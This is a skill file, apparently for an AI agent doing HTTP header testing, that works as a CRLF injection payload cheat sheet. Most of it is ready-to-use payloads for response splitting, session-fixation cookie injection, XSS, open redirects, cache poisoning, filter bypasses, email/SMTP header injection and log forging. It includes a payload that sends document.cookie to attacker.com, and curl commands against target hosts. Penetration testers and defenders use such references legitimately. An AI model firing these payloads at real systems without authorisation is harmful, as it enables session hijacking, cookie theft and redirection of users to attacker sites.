---
name: crlf
description: CRLF injection for header manipulation, response splitting, and session fixation. Use for HTTP header testing.
---

# CRLF Injection

## Description
CRLF (Carriage Return Line Feed) injection occurs when an attacker injects CR (\r) and LF (\n) characters into an application. Since HTTP headers are terminated by CRLF sequences, this can allow attackers to inject additional headers or even entire HTTP responses.

## Character Encoding

### URL Encoded
```
%0d = Carriage Return (CR, \r)
%0a = Line Feed (LF, \n)
%0d%0a = CRLF
```

### Double URL Encoded
```
%250d = %0d
%250a = %0a
%250d%250a = CRLF
```

### Unicode/UTF-8
```
%E5%98%8A = \n (Line Feed)
%E5%98%8D = \r (Carriage Return)
嘊 = converts to \n
嘍 = converts to \r
```

## Attack Vectors

### 1. HTTP Response Splitting

**Basic Payload:**
```
/page?param=value%0d%0aInjected-Header:injected_value
```

**Response:**
```http
HTTP/1.1 200 OK
Set-Cookie: param=value
Injected-Header: injected_value
```

### 2. Session Fixation via Cookie Injection

**Payload:**
```
/page?param=value%0d%0aSet-Cookie:session=attacker_session
```

**Result:**
```http
HTTP/1.1 200 OK
Set-Cookie: param=value
Set-Cookie: session=attacker_session
```

### 3. XSS via CRLF

**Disable XSS Protection:**
```
/page?param=%0d%0aX-XSS-Protection:0%0d%0a%0d%0a<script>alert(1)</script>
```

**Inject HTML Body:**
```
/page?param=%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a<html><script>alert(1)</script>
```

**Full Response Split:**
```
/page?param=%0d%0a%0d%0a<html><body><script>alert(document.domain)</script></body></html>
```

### 4. Open Redirect

**Payload:**
```
/page?param=%0d%0aLocation:https://attacker.com%0d%0a
```

**Result:**
```http
HTTP/1.1 200 OK
Location: https://attacker.com
```

### 5. Cache Poisoning

**Payload:**
```
/page?param=%0d%0aContent-Type:text/html%0d%0aX-Cache:hit%0d%0a%0d%0a<script>alert(1)</script>
```

## Filter Bypass Techniques

### Double Encoding
```
%250d%250a -> %0d%0a -> CRLF
```

### Unicode Bypass
```
%E5%98%8A%E5%98%8D -> CRLF
%u000d%u000a -> CRLF
```

### Null Byte
```
%00%0d%0a
param%00=%0d%0aHeader:value
```

### Different Line Terminators
```
%0a (LF only - works on some systems)
%0d (CR only)
```

### Mixed Encoding
```
\r\n
\r%0a
%0d\n
```

### Case Variation
```
%0D%0A (uppercase)
%0d%0A (mixed)
```

## Exploitation Payloads

### Header Injection Collection
```
# Basic CRLF
%0d%0aHeader-Name:Header-Value

# Double CRLF (body injection)
%0d%0a%0d%0aBody-Content

# Cookie injection
%0d%0aSet-Cookie:admin=true

# Security header bypass
%0d%0aX-XSS-Protection:0
%0d%0aContent-Security-Policy:default-src%20'unsafe-inline'
%0d%0aX-Content-Type-Options:nosniff

# Redirect injection
%0d%0aLocation:https://attacker.com

# Content-Type injection
%0d%0aContent-Type:text/html
```

### Full XSS Payload
```
%0d%0aContent-Length:100%0d%0a%0d%0a<html><head></head><body><script>document.location='https://attacker.com/?c='+document.cookie</script></body></html>
```

### Log Injection
```
# Inject fake log entries
user=admin%0d%0a[2024-01-01 12:00:00] SUCCESS: Admin logged in from 127.0.0.1
```

## Testing Locations

### Common Injection Points
```
- URL parameters
- Cookie values
- HTTP headers (User-Agent, Referer)
- POST body parameters
- JSON values
- XML attributes
```

### Testing Methodology
```bash
# Test with curl
curl -i "https://target.com/page?param=test%0d%0aInjected:header"

# Check response headers
curl -I "https://target.com/page?param=test%0d%0aSet-Cookie:evil=true"
```

## Real-World Scenarios

### Email Header Injection
```
From: attacker@evil.com%0d%0aBcc:victim@target.com
Subject: Test%0d%0a%0d%0aInjected body content
```

### SMTP CRLF Injection
```
MAIL FROM:<attacker@evil.com%0d%0aRCPT TO:<victim@target.com%0d%0aDATA%0d%0a>
```

### Log Forging
```
username=admin%0d%0a[INFO] User admin logged in successfully
```

## Detection Tools

### Manual Testing
```bash
# Basic test
curl -v "https://target.com/api?param=test%0d%0aInjected:value"

# Check for header reflection
curl -v "https://target.com/redirect?url=https://target.com%0d%0aSet-Cookie:test=1"
```

### Automated Tools
- Burp Suite Scanner
- OWASP ZAP
- Nuclei templates

## Impact

### Severity Levels
```
High:
- XSS via response splitting
- Session fixation
- Cache poisoning

Medium:
- Open redirect
- Security header bypass

Low:
- Header injection without direct impact
- Log injection
```

## Prevention

```
1. Input validation - reject or encode CR/LF characters
2. Output encoding - encode special characters in headers
3. Use frameworks that handle header encoding automatically
4. Avoid user input in HTTP headers when possible
5. Use Content Security Policy
```

## References
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CRLF%20Injection
- https://owasp.org/www-community/vulnerabilities/CRLF_Injection
- https://portswigger.net/kb/issues/00200190_http-response-header-injection
